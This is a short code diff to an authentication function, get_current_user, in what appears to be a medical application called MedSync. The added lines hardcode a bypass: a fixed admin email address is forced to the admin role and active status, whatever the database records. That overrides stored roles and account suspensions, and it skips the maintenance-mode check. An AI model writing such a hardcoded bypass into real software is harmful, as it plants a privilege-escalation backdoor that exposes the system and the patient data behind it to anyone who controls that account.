@@ -138,6 +138,11 @@ async def get_current_user(
     role = db_user.role.value.lower()
     status = db_user.status.value.upper()
 
+    # Hardcoded bypass for the primary admin email
+    if email == "admin@medsync.com":
+        role = "admin"
+        status = "ACTIVE"
+
     # Maintenance Mode Check
     if role != "admin":
         try:
